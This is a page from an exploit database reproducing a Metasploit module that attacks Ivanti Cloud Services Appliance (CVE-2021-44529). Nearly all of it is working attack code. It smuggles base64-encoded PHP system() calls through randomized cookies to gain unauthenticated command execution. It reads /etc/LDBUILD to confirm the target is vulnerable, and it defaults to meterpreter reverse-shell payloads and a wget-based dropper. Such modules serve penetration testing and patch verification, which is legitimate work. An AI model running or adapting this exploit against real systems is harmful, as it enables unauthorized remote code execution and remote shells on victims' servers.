---
title: Ivanti Cloud Services Appliance (CSA) Command Injection
url: https://cxsecurity.com/issue/WLB-2023010026
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-01-19
fetch_date: 2025-10-04T04:15:10.277503
---

# Ivanti Cloud Services Appliance (CSA) Command Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Ivanti Cloud Services Appliance (CSA) Command Injection** **2023.01.18**  Credit:  **[h00die-gr3y](https://cxsecurity.com/author/h00die-gr3y/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-78](https://cxsecurity.com/cwe/CWE-78 "Click to see CWE-78")** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Ivanti Cloud Services Appliance (CSA) Command Injection',
'Description' => %q{
This module exploits a command injection vulnerability in the Ivanti Cloud Services Appliance (CSA)
for Ivanti Endpoint Manager. A cookie based code injection vulnerability in the
Cloud Services Appliance before `4.6.0-512` allows an unauthenticated user to
execute arbitrary code with limited permissions. Successful exploitation results
in command execution as the `nobody` user.
},
'License' => MSF\_LICENSE,
'Author' => [
'Jakub Kramarz', # Discovery
'h00die-gr3y <h00die.gr3y[at]gmail.com>' # MSF Module contributor
],
'References' => [
['CVE', '2021-44529'],
['URL', 'https://forums.ivanti.com/s/article/SA-2021-12-02'],
['URL', 'https://attackerkb.com/topics/XTKrwlZd7p/cve-2021-44529'],
['EDB', '50833'],
['PACKETSTORM', '166383']
],
'DisclosureDate' => '2021-12-02',
'Platform' => ['unix', 'linux', 'php'],
'Arch' => [ARCH\_CMD, ARCH\_X64, ARCH\_PHP],
'Privileged' => false,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH\_CMD,
'Type' => :unix\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/python/meterpreter/reverse\_http'
}
}
],
[
'PHP Command',
{
'Platform' => 'php',
'Arch' => ARCH\_PHP,
'Type' => :php\_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'php/meterpreter/reverse\_tcp'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH\_X64],
'Type' => :linux\_dropper,
'CmdStagerFlavor' => ['wget', 'printf', 'echo'],
'DefaultOptions' => {
'PAYLOAD' => 'linux/x64/meterpreter\_reverse\_http'
}
}
]
],
'Payload' => {
'BadChars' => '"' # We use this to denote the payload as a string so having it in the payload would escape things.
},
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true
},
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
end
# Randomize the cookie pairs for the request.
def randomize\_cookie(payload)
# Number of cookie pairs should be at least 4, and the first cookie pair should
# always have the value 'ab'. Note that the Nth cookie in the request, where
# N=no\_of\_cookies-2, should contain the payload.
#
# example 1: Cookie: sG34st=ab;g3sBdnn=<PAYLOAD>;h4hYyeEe=;j7sJJjjs=;
# example 2: Cookie: dvDfR6F=ab;bxvGE=;Fs=<PAYLOAD>;uEn44Nkk=;nnXk=;
no\_of\_cookies = rand(4..8)
cookie\_name = Rex::Text.rand\_text\_alphanumeric(1..8)
payload\_cookie\_number = (no\_of\_cookies - 2)
random\_cookie = "#{cookie\_name}=ab;"
for cookie\_no in 2..no\_of\_cookies do
cookie\_name = Rex::Text.rand\_text\_alphanumeric(1..8)
if cookie\_no == payload\_cookie\_number
random\_cookie << "#{cookie\_name}=#{payload};"
else
random\_cookie << "#{cookie\_name}=;"
end
end
return random\_cookie
end
def check\_vuln
# check RCE by grabbing CSA version banner stored on /etc/LDBUILD
payload = Base64.strict\_encode64('readfile("/etc/LDBUILD");')
cookie\_payload = randomize\_cookie(payload)
return send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'client', 'index.php'),
'cookie' => cookie\_payload.to\_s
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
return nil
end
def execute\_command(cmd, \_opts = {})
case target['Type']
when :unix\_cmd
payload = Base64.strict\_encode64("system(\"#{cmd}\");")
when :php\_cmd
payload = Base64.strict\_encode64(cmd.to\_s)
when :linux\_dropper
payload = Base64.strict\_encode64("system(\"#{cmd}\");")
end
cookie\_payload = randomize\_cookie(payload)
return send\_request\_cgi({
'method' => 'GET',
'uri' => normalize\_uri(target\_uri.path, 'client', 'index.php'),
'cookie' => cookie\_payload.to\_s
})
rescue StandardError => e
elog("#{peer} - Communication error occurred: #{e.message}", error: e)
fail\_with(Failure::Unknown, "Communication error occurred: #{e.message}")
end
def check
print\_status("Checking if #{peer} can be exploited.")
res = check\_vuln
return CheckCode::Unknown('No response received from the target.') unless res
return CheckCode::Safe unless res.code == 200 && !res.body.blank? && res.body =~ /<c123>/
begin
parsed\_html = Nokogiri::HTML.parse(res.body)
rescue Nokogiri::SyntaxError => e
return CheckCode::Unknown("Unable to parse the HTTP response! Error: #{e}")
end
csa\_version = parsed\_html.at\_css('c123')
if csa\_version&.text&.blank?
CheckCode::Vulnerable('Could not retrieve version.')
else
CheckCode::Vulnerable("Version: #{csa\_version.text}")
end
end
def exploit
case target['Type']
when :unix\_cmd
print\_status("Executing #{target.name} with #{payload.encoded}")
execute\_command(payload.encoded)
when :php\_cmd
print\_status("Executing #{target.name} with #{payload.encoded}")
execute\_command(payload.encoded)
when :linux\_dropper
print\_status("Executing #{target.name}")
execute\_cmdstager(linemax: 262144)
end
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023010026)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

| ...